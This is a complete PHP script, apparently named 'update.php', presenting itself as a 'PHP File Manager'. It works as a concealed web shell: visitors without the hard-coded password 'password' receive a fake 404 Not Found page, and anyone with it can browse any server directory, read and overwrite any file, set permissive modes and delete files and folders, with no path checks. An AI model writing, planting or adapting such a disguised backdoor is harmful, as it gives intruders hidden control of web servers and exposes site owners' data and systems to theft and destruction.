<?php
$pwd = "password";

if(!isset($_GET["p"]) || $_GET["p"] != $pwd)
{
	http_response_code(404);
	echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n";
	echo "<html><head>\n";
	echo "<title>404 Not Found</title>\n";
	echo "</head><body>\n";
	echo "<h1>Not Found</h1>\n";
	echo "<p>The requested URL was not found on this server.</p>\n";
	echo "</body></html>\n";
	die();
}

$dir = $_GET["d"];
$url0 = "update.php?p=$pwd&d=";
$url = "$url0$dir";

if(isset($_POST["dsubmit"]))
{
	$fn = $dir . "/" . $_POST["dname"];
	if(!file_exists($fn))
	{
		mkdir($fn, 0777, true);
	}
}

if(isset($_POST["edsubmit"]))
{
	$fn = $dir . "/" . $_POST["edname"];
	$txt = $_POST["edtext"];
	$writable = (is_writable($fn)) ? TRUE : chmod($fn, 0755);
	if($writable)
	{
		file_put_contents($fn, $txt);
	}
}

if(isset($_POST["ad"]))
{
	$fn = $dir . "/" . $_POST["adn"];
	if(is_dir($fn))
	{
		rmdir($fn);
	}
	else
	{
		unlink($fn);
	}
}


$efile = "";
$epath = "";

if(isset($_POST["ae"]))
{
	$efile = $_POST["aen"];
	$epath = "$dir/$efile";
}


?>
<!DOCTYPE html>
<html lang="de">
<head>
	<meta charset="utf-8">
	<title>PHP File Manager</title>
	<style type="text/css">

html, body
{
	padding: 5px;
	margin: 0px;
	font-size: 12px;
	font-family: monospace;
}

.list
{
	min-width: 500px;
	border-collapse: collapse;
	border: 1px solid black;
}

.list tr
{
	max-height: 30px;
}

.list td, .list th
{
	border: 1px solid black;
	padding: 5px;
}

.dir
{
	text-align: right;
	font-weight: bold;
	width: auto;
}

.size
{
	text-align: right;
	width: auto;
}

.options
{
	width: auto;
}

h1
{
	margin: 0px 0px 5px 0px;
	padding: 0px;
}

h2
{
	margin: 0px 0px 5px 0px;
}

#half
{
	border-collapse: collapse;
	margin-top: 10px;
}

#left
{
	vertical-align: top;
}

#right
{
	padding-left: 10px;
	vertical-align: top;
}

.part
{
	margin-bottom: 30px;
}

.upld
{
	width: 170px;
	display: inline-block;
	text-align: center;
}

.upld, input[type=submit], input[type=button]
{
	display: inline-block;
	border: 1px solid black;
	background-color: white;
	color: black;
	font-family: monospace;
	font-size: 12px;
	padding: 5px 20px;
	transition: 0.1s all linear;
	width: 170px;
}

.upld:hover, input[type=submit]:hover, input[type=button]:hover
{
	background-color: black;
	color: white;
	cursor: pointer;
	transition: 0.1s all linear;
}

input[type=text]
{
	width: 200px;
}

input[type=text], textarea
{
	border: 1px solid black;
	font-size: 12px;
	font-family: monospace;
	padding: 5px;
}

*:focus
{
	border-color: inherit;
	-webkit-box-shadow: none;
	box-shadow: none;
	outline: none;
}

input[type=text]:focus, textarea:focus
{
	border: 1px solid #2299ff;
}

.actf
{
	display: block;
}

.act
{
	width: auto !important;
}

textarea
{
	resize: none;
	display: block;
	margin-top: 10px;
}

.td
{
	margin: 0px;
}

.fup
{
	position: absolute;
	left: -99999rem;
}

.name
{
	width: 100%;
}

.abtns, .abtns td
{
	padding: 0px;
	border: none;
	border-collapse: collapse;
}

	</style>
</head>
<body>
<h1>PHP File Manager</h1>
<?php

	$parent = dirname($dir);

	echo "<p class=\"td\">Directory: $dir</p>";
	echo "<p class=\"td\"><a href=\"$url0.\">Default</a> ";
	echo "<a href=\"$url0/\">Root</a> ";
	echo "<a href=\"$url0$parent\">Parent</a> ";
	echo "<a href=\"$url0$dir/..\">Previous</a></p>";

?>
<table id="half">
<tr>
<?php

	$files = array_diff(scandir($dir), array('..', '.'));

	echo "<td id=\"left\">\n";

	echo "<table class=\"list\">";
	echo "<tr><th class=\"name\">Name</th><th>Size</th><th>Actions</th></tr>";

	foreach($files as $file)
	{
		$path = "$dir/$file";
		echo "<tr>\n";
		$isd = false;
		if(is_dir($path))
		{
			$isd = true;
			echo "<td class=\"name\"><a href=\"$url/$file\">$file</a></td>\n";
			echo "<td class=\"dir\">&lt;DIR&gt;</td>\n";
		}
		else
		{
			echo "<td class=\"name\"><a href=\"$path\">$file</a></td>\n";
			$size = filesize($path);
			echo "<td class=\"size\">$size</td>\n";
		}

		echo "<td class=\"options\">\n";
		echo "<table class=\"abtns\"><tr>";

		echo "<td><form class=\"actf\" action=\"\" method=\"post\"><input type=\"hidden\" name=\"adn\" value=\"$file\"><input type=\"submit\" class=\"act\" name=\"ad\" value=\"Delete\"></form></td>";

		if(!$isd)
		{
			echo "<td><form class=\"actf\" action=\"\" method=\"post\"><input type=\"hidden\" name=\"aen\" value=\"$file\"><input type=\"submit\" class=\"act\" name=\"ae\" style=\"margin-left: 5px\" value=\"Edit/View\"></form></td>";
		}

		echo "</tr></table>";
		echo "</td>\n";
		echo "</tr>\n";
	}

	echo "</table>\n";
?>
</td>
<td id="right">
	<div class="part">
		<form action="" method="post">
			<h2>Create Directory</h2>
			<input type="text" name="dname" id="dname" placeholder="Directory Name">
			<input type="submit" value="Create Folder" name="dsubmit">
		</form>
	</div>

	<!--<div class="part">
		<form action="" method="post" enctype="multipart/form-data">
			<h2>Upload file</h2>
			<label for="upfile" class="upld" id="upfile0">Select File</label>
			<input type="file" name="upfile" id="upfile" class="fup">
			<input type="submit" value="Upload File" name="upsubmit">
		</form>
	</div>-->

	<div class="part">
		<form action="" method="post">
			<h2>Edit file</h2>
			<input type="text" name="edname" placeholder="Filename" value="<?php echo $efile; ?>">
			<input type="submit" value="Save File" name="edsubmit">
			<textarea name="edtext" rows="40" cols="80" spellcheck="false" placeholder="Content"><?php echo htmlspecialchars(file_get_contents($epath)); ?></textarea>
		</form>
	</div>
</td>
</tr>
</table>
<!--
<script type="text/javascript">

document.getElementById("upfile").onchange = function()
{
	document.getElementById("upfile0").innerText = document.getElementById("upfile").files[0].name;
};

</script>
-->
</body>
</html>
